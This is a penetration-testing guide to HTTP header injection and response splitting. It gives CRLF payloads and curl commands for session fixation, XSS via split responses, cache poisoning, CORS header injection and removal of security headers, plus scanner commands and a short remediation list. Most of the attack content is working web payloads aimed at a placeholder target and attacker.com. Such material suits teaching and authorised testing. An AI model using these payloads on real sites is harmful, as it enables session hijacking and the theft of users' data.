---
title: "HTTP Header Injection / Response Splitting"
date: 2026-02-24
draft: false
---

# HTTP Header Injection / Response Splitting

> **Severity**: High | **CWE**: CWE-113, CWE-74
> **OWASP**: A03:2021 – Injection

---

## What Is HTTP Header Injection?

HTTP header injection occurs when user-controlled data is inserted into HTTP response headers without proper sanitization. CRLF sequences (`\r\n` / `%0d%0a`) terminate the current header and inject new ones — enabling **response splitting**, **cache poisoning**, **session fixation**, and **XSS** via injected HTML body.

```
Vulnerable redirect:
  Location: https://target.com/redirect?url=USER_INPUT

Injected input: attacker.com\r\nSet-Cookie: session=EVIL

Response becomes:
  HTTP/1.1 302 Found
  Location: https://target.com/redirect?url=attacker.com
  Set-Cookie: session=EVIL        ← injected new header
```

**Response Splitting** (HTTP/1.1): inject `\r\n\r\n` to terminate headers and start injected body:
```
Location: x%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a...
```

---

## Discovery Checklist

**Phase 1 — Find Injection Points**
- [ ] Find redirect parameters that appear in `Location:` header
- [ ] Find user-input reflected in `Set-Cookie:`, `Content-Disposition:`, `Link:` headers
- [ ] Find download/file-serve endpoints: filename in `Content-Disposition`
- [ ] Find CORS-reflected Origin in `Access-Control-Allow-Origin`
- [ ] Find any custom header echoed back from request (X-Request-ID, X-Correlation-ID)
- [ ] Find error pages that reflect URL or path into headers

**Phase 2 — Test CRLF**
- [ ] Inject `%0d%0a` (URL-encoded CRLF) and check if newline appears in response headers
- [ ] Inject `%0a` (LF only) — some servers only strip `\r\n` not `\n`
- [ ] Inject `%0d` (CR only)
- [ ] Inject Unicode newlines: `%c8%a0` (U+0220), `%e2%80%a8` (U+2028 LS), `%e2%80%a9` (U+2029 PS)
- [ ] Test in cookie value: `Set-Cookie: pref=INJECTED`
- [ ] Test double URL encoding: `%250d%250a`

**Phase 3 — Escalate**
- [ ] Inject `Set-Cookie` → session fixation
- [ ] Inject `Location` in response body → XSS via response splitting
- [ ] Inject `X-XSS-Protection: 0` to disable browser XSS auditor
- [ ] Inject `Content-Security-Policy` to remove protections
- [ ] Inject `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true`

---

## Payload Library

### Payload 1 — Basic CRLF Detection

```bash
# Test Location header injection:
curl -sI "https://target.com/redirect?url=https://attacker.com%0d%0aX-CRLF-Test: injected" | \
  grep -i "x-crlf\|location"

# LF-only injection (some servers):
curl -sI "https://target.com/redirect?url=https://attacker.com%0aX-Test: injected" | \
  grep -i "x-test"

# In cookie parameter:
curl -sI "https://target.com/login?lang=en%0d%0aSet-Cookie: injected=value" | \
  grep -i "set-cookie"

# In custom header reflection:
curl -sI "https://target.com/" \
  -H "X-Request-ID: test%0d%0aX-Injected: yes" | \
  grep -i "x-injected"

# Double encoding bypass (WAF decodes once, server decodes twice):
curl -sI "https://target.com/redirect?url=x%250d%250aX-Test: injected"
# %25 = %, so %250d = %0d after first decode → server gets %0d%0a

# Unicode line separators:
curl -sI "https://target.com/redirect?url=x%e2%80%a8X-Test: injected"   # U+2028
curl -sI "https://target.com/redirect?url=x%e2%80%a9X-Test: injected"   # U+2029
```

### Payload 2 — Session Fixation via Set-Cookie Injection

```bash
# Inject Set-Cookie to fix victim session:
https://target.com/redirect?url=https://legitimate.com%0d%0aSet-Cookie:%20session=ATTACKER_CONTROLLED_VALUE

# Full attack:
# 1. Send victim this URL:
# https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:%20auth_session=FIXED_VALUE;%20path=/

# 2. Victim clicks → browser gets response:
#    Location: https://target.com
#    Set-Cookie: auth_session=FIXED_VALUE; path=/

# 3. Victim logs in with the injected session ID
# 4. Attacker uses auth_session=FIXED_VALUE → now authenticated

# Content-Disposition injection → force download of attacker content:
curl -s "https://target.com/download?file=report.pdf%0d%0aContent-Disposition:%20attachment;%20filename=malware.exe%0d%0aContent-Type:%20application/octet-stream"

# Set-Cookie with SameSite=None to bypass CSRF:
url=x%0d%0aSet-Cookie: csrf_token=KNOWN_VALUE; SameSite=None; Secure
```

### Payload 3 — XSS via Response Splitting (HTTP/1.1)

```bash
# Inject entirely new HTTP response body:
# Target: GET /redirect?url=USER_INPUT → 302 Location: USER_INPUT

# Payload (URL decoded for clarity):
# url=https://x.com\r\n
# Content-Length: 0\r\n
# \r\n
# HTTP/1.1 200 OK\r\n
# Content-Type: text/html\r\n
# Content-Length: 39\r\n
# \r\n
# <script>alert(document.cookie)</script>

# URL-encoded payload:
PAYLOAD="https://x.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2039%0d%0a%0d%0a<script>alert(document.cookie)</script>"
curl -sI "https://target.com/redirect?url=$PAYLOAD"

# Note: response splitting is largely mitigated in HTTP/2 and modern servers
# but still relevant in HTTP/1.1 backends, proxy chains, and legacy apps

# Simpler XSS via injected Content-Type:
url=x%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
# If status code allows body → XSS
```

### Payload 4 — Cache Poisoning via CRLF

```bash
# Inject headers that affect caching:
# Add: Cache-Control: public, max-age=86400 to a private response

url=x%0d%0aCache-Control:%20public,%20max-age=86400
# → Response now cacheable by CDN → other users get cached version

# Add fake headers to confuse CDN:
url=x%0d%0aX-Cache:%20HIT%0d%0aAge:%200

# Combine with XSS for persistent cache poisoning:
# 1. Inject Content-Type + body
# 2. If CDN caches it → all users get XSS response from cache

# Inject Vary header to prevent cache differentiation:
url=x%0d%0aVary:%20*
```

### Payload 5 — CORS Header Injection

```bash
# Inject permissive CORS headers into a response:
url=x%0d%0aAccess-Control-Allow-Origin:%20https://attacker.com%0d%0aAccess-Control-Allow-Credentials:%20true

# If reflected in 200 response (not just redirect):
# Attacker.com can now make CORS requests to target.com and receive responses
# with victim's credentials

# Test if Origin is reflected:
curl -sI https://target.com/api/data \
  -H "Origin: https://attacker.com" | grep -i "access-control"

# Inject via X-Forwarded-For → reflected in response header:
curl -sI https://target.com/ \
  -H "X-Forwarded-For: 1.2.3.4%0d%0aX-Injected: test"
```

### Payload 6 — Content-Disposition Header Injection

```bash
# In file download endpoints — inject to override filename/type:
https://target.com/download?filename=report%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# Force HTML rendering via Content-Type injection:
https://target.com/api/export?format=csv%0d%0aContent-Type:%20text/html

# Inject Content-Disposition to change download filename:
filename=report.csv%0d%0aContent-Disposition:%20attachment;%20filename=malware.exe

# X-Content-Type-Options removal:
url=x%0d%0aX-Content-Type-Options:%20nosniff%0d%0a
# (removing nosniff allows MIME type confusion)
```

### Payload 7 — Security Header Removal

```bash
# Remove XSS/clickjacking protections via injection:

# Disable browser XSS auditor (legacy Chrome):
url=x%0d%0aX-XSS-Protection:%200

# Remove CSP:
url=x%0d%0aContent-Security-Policy:%20

# Remove X-Frame-Options (enable clickjacking):
url=x%0d%0aX-Frame-Options:%20ALLOWALL

# Inject permissive CSP:
url=x%0d%0aContent-Security-Policy:%20script-src%20*%20'unsafe-inline'%20'unsafe-eval'
```

---

## Tools

```bash
# crlfuzz — automated CRLF injection scanner:
go install github.com/dwisiswant0/crlfuzz@latest
crlfuzz -u "https://target.com/redirect?url=FUZZ" -t 50

# CRLFSuite:
pip3 install crlfmap
crlfmap -u "https://target.com/?redirect=" -w payloads.txt

# ffuf with CRLF payloads:
ffuf -u "https://target.com/redirect?url=FUZZ" \
  -w /usr/share/seclists/Fuzzing/CRLF-Injection.txt \
  -mr "X-CRLF-Test"

# Burp Suite:
# - Active Scan → Header Injection checks built-in
# - Intruder: inject CRLF payload list in URL parameters
# - Param Miner: discovers reflected headers
# - Use \r\n in match/replace for testing

# Manual CRLF payload list:
cat > crlf_payloads.txt << 'EOF'
%0d%0aX-Test: injected
%0aX-Test: injected
%0d%0a X-Test: injected
%0D%0AX-Test: injected
%e5%98%8a%e5%98%8dX-Test: injected
%e5%98%8aX-Test: injected
\r\nX-Test: injected
\nX-Test: injected
%250d%250aX-Test: injected
%u000dX-Test: injected
EOF

# Check response headers for injected values:
for payload in $(cat crlf_payloads.txt); do
  result=$(curl -sI "https://target.com/redirect?url=$payload" 2>/dev/null | \
    grep -i "x-test")
  if [ -n "$result" ]; then
    echo "[VULN] $payload → $result"
  fi
done
```

---

## Remediation Reference

- **Validate and strip CRLF** (`\r`, `\n`, `%0d`, `%0a`) from all values used in HTTP headers
- **Use framework-provided redirect functions** — never concatenate user input into `Location:` header directly
- **Encode header values**: URL-encode or percent-encode values when inserting into headers
- **Reject newlines at input validation layer** — block `\r`, `\n`, `%0d`, `%0a`, Unicode line separators
- **HTTP/2 eliminates response splitting** at the binary framing level — but backend HTTP/1.1 connections may still be vulnerable in proxy chains
- **Allowlist characters** for parameters used in headers: e.g., redirect URLs should only contain alphanumeric, `-`, `.`, `_`, `/`, `:`

*Part of the Web Application Penetration Testing Methodology series.*
